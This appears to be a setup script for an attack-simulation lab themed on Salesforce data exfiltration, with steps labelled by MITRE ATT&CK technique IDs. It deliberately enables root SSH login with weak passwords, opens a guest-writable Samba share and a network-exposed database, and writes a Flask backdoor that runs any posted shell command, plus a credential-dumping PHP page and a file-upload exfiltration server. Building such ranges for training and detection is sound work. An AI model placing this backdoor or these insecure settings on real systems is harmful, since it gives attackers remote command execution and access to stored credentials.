############### SALESFORCE DATA EXFILTRATION

#
## Global commands
#
apt-get update
apt-get install -y python3 python3-pip sshpass curl socat

## SSH
apt-get install -y openssh-server
mkdir -p /var/run/sshd
echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config


pgrep -x "sshd" > /dev/null || /usr/sbin/sshd & 


# Root password
echo 'root:RootPass123' | chpasswd

# User attacker

useradd -m attacker -s /bin/bash
mkdir -p /home/attacker
echo 'attacker:Passw0rd' | chpasswd
usermod -aG sudo attacker

# DebianUser
useradd -M  DebianUser
mkdir -p /home/DebianUser
echo 'DebianUser:DebianUser' | chpasswd
(echo 'DebianUser'; echo 'DebianUser') | smbpasswd -a -s DebianUser

pgrep -x "php-fpm8.4" > /dev/null || php-fpm8.4 &


apt-get install -y mariadb-server
sed -i 's/^bind-address\s*=.*/bind-address = 0.0.0.0/' /etc/mysql/mariadb.conf.d/50-server.cnf
pgrep -x "mariadbd-safe" > /dev/null || mariadbd-safe &
sleep 5
mysql -u root -e "ALTER USER 'root'@'localhost' IDENTIFIED BY 'RootPassw0rd';FLUSH PRIVILEGES;"
mysql -u root -pRootPassw0rd -e "CREATE DATABASE sensitive_data;"
mysql -u root -pRootPassw0rd -e "CREATE USER 'attacker'@'%' IDENTIFIED BY 'Attack3rPass';"
mysql -u root -pRootPassw0rd -e "GRANT ALL PRIVILEGES ON sensitive_data.* TO 'attacker'@'%'; FLUSH PRIVILEGES;"
mysql -u root -pRootPassw0rd -e "USE sensitive_data; CREATE TABLE credentials(id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(50), password VARCHAR(255));"
mysql -u root -pRootPassw0rd -e "INSERT INTO sensitive_data.credentials(username,password) VALUES ('admin','5f4dcc3b5aa765d61d8327deb882cf99');"

apt-get install -y samba samba-common-bin
printf '[global]\n   workgroup = WORKGROUP\n   server string = Samba Server\n   netbios name = debianA\n   security = user\n   map to guest = Bad User\n\n[share]\n   path = /srv/samba/share\n   browsable =yes\n   writable = yes\n   guest ok = yes\n   read only = no\n' > /etc/samba/smb.conf
mkdir -p /srv/samba/share
chmod -R 0777 /srv/samba/share
printf '#!/bin/sh\necho "This is a fake Windows Defend service file"\nsleep infinity\n' > /srv/samba/share/fake_service.sh
chmod +x /srv/samba/share/fake_service.sh
pgrep -x "smbd" > /dev/null || /usr/sbin/smbd --no-process-group --foreground &

################################################ End of Global Section


# T1059.006
pip3 install --break-system-packages flask flask-cors requests
mkdir -p /home/attacker/malware
cat > /home/attacker/malware/backdoor.py << 'EOF'
#!/usr/bin/env python3
from flask import Flask, request
app = Flask(__name__)
@app.route("/exec", methods=["POST"])
def exec_cmd():
 import subprocess
 cmd = request.form.get("cmd")
 if not cmd:
  return "No command", 400
 try:
  output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5)
  return output
 except Exception as e:
  return str(e), 500
if __name__ == "__main__":
 app.run(host="0.0.0.0", port=5055)
EOF
chown attacker:attacker /home/attacker/malware/backdoor.py
chmod +x /home/attacker/malware/backdoor.py

if ! ss -tuln | grep -q ":5055 "; then
 su attacker -c "python3 /home/attacker/malware/backdoor.py &"
 else echo "Port 5055 already in use";
fi

# T1213.004
cat > /var/www/html/crm.php << 'EOF'
<?php
$conn = new mysqli("localhost","attacker","Attack3rPass","sensitive_data");
if($conn->connect_error){
    die("Connection failed: ".$conn->connect_error);
}
$result = $conn->query("SELECT * FROM credentials");
echo "<h1>Stolen Credentials</h1>";
echo "<table border='1'><tr><th>ID</th><th>Username</th><th>Password Hash</th></tr>";
while($row = $result->fetch_assoc()) {
    echo "<tr><td>".$row['id']."</td><td>".$row['username']."</td><td>".$row['password']."</td></tr>";
}
echo "</table>";
$conn->close();
?>
EOF

# T1671

apt-get install -y python3 python3-pip wget curl
pip install --break-system-packages flask requests
useradd -m -s /bin/bash oauthapp
mkdir -p /home/oauthapp/app
cat > /home/oauthapp/app/server.py << 'EOF'
from flask import Flask, request, jsonify
app = Flask(__name__)
tokens = {}

@app.route("/oauth/authorize", methods=["POST"])
def authorize():
    data = request.json
    tokens[data["client_id"]] = "access_token_" + data["client_id"]
    return jsonify({"access_token": tokens[data["client_id"]]}), 200

@app.route("/data", methods=["GET"])
def data():
    auth = request.headers.get("Authorization")
    if auth and auth.startswith("Bearer "):
        token = auth.split()[1]
        if token in tokens.values():
            return jsonify({"data": "sensitive_data_for_" + token}), 200
    return jsonify({"error": "Unauthorized"}), 401

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8444)
EOF
chown -R oauthapp:oauthapp /home/oauthapp

if ! ss -tuln | grep -q ":8444 "; then
 su - oauthapp -c "python3 /home/oauthapp/app/server.py &"
 else echo "Port 8444 already in use";
fi


# T1567
mkdir -p /var/www/html/exfil
cat > /var/www/html/exfil/index.html << 'EOF'
<html><body><h1>Exfiltration Endpoint</h1></body></html>
EOF
python3 -m pip install --break-system-packages flask requests
cat > /root/exfil_server.py << 'EOF'
from flask import Flask, request
app=Flask(__name__)
@app.route("/upload", methods=["POST"])
def upload():
    f=request.files["file"]
    f.save("/tmp/"+f.filename)
    return "OK", 200
app.run(host="0.0.0.0", port=8116)
EOF
if ! ss -tuln | grep -q ":8116 "; then
python3 /root/exfil_server.py &
 else echo "Port 8116 already in use";
fi

# T1036
pip3 install --break-system-packages flask flask-cors requests
mkdir -p /home/attacker/malware
cat > /home/attacker/malware/backdoor.py << 'EOF'
#!/usr/bin/env python3
from flask import Flask, request
app = Flask(__name__)
@app.route("/exec", methods=["POST"])
def exec_cmd():
 import subprocess
 cmd = request.form.get("cmd")
 if not cmd:
  return "No command", 400
 try:
  output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5)
  return output
 except Exception as e:
  return str(e), 500
if __name__ == "__main__":
 app.run(host="0.0.0.0", port=5055)
EOF
chown attacker:attacker /home/attacker/malware/backdoor.py
chmod +x /home/attacker/malware/backdoor.py

if ! ss -tuln | grep -q ":5055 "; then
 su attacker -c "python3 /home/attacker/malware/backdoor.py &"
 else echo "Port 5055 already in use";
fi

# T1585.002
apt-get -y install mailutils


################################
